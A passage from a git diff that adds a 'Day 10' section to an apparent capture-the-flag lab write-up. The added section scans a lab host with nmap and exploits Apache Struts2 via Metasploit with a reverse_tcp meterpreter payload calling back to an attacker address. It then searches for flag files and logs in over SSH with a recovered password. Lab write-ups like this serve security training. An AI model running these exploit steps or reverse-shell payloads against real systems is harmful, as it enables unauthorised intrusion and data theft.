@@ -328,17 +328,69 @@ Answer
 
 ## Day 10: Metasploit-a-ho-ho-ho
 
+quick scan the target
 
+```
+nmap -A -T4 10.10.144.227
+```
 
+![image](https://user-images.githubusercontent.com/90561566/209523038-96ce8da9-8a54-4ac8-bde3-43847e4e4007.png)
 
+i know it has a vulnerability related to Apache Struts2
 
+```
+msfconsole
+search Apache Struts2
+```
 
+![image](https://user-images.githubusercontent.com/90561566/209524167-d2de55c0-00dc-478a-90fe-b34fb32fe795.png)
 
+```
+set RHOSTS 10.10.144.227
+set RPORT 80
+set TARGETURI /showcase.action
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LHOST 10.8.0.74
+exploit
+```
 
+exploit successful
 
+![image](https://user-images.githubusercontent.com/90561566/209525033-d24044ba-9897-452c-83a0-ff04595379e7.png)
 
+```
+shell
+find / 2>>/dev/null | grep -i "flag"
+```
 
+![image](https://user-images.githubusercontent.com/90561566/209525741-bc3ba341-b07b-4280-859b-e7b2bfdf4860.png)
 
+```
+cat /usr/local/tomcat/webapps/ROOT/ThisIsFlag1.txt
+```
+
+i found santa password at his folder
+
+![image](https://user-images.githubusercontent.com/90561566/209526132-1330f313-b44b-4ec8-bf17-a141bf86dbc4.png)
+
+```
+ssh santa@10.10.144.227
+```
+
+![image](https://user-images.githubusercontent.com/90561566/209526317-c143ce01-e91c-447a-bb70-f866a728de1d.png)
+
+```
+cat -n naughty_list.txt | grep 148
+cat -n nice_list.txt | grep 52
+```
+
+![image](https://user-images.githubusercontent.com/90561566/209527167-dc12f893-7748-483c-a968-bc0bcac5a304.png)
+
+Answer
+
+![image](https://user-images.githubusercontent.com/90561566/209527294-5c9b5989-2e03-4541-b7a8-2901fed312e8.png)
+
+## Day 11: Elf Applications
 
 
 
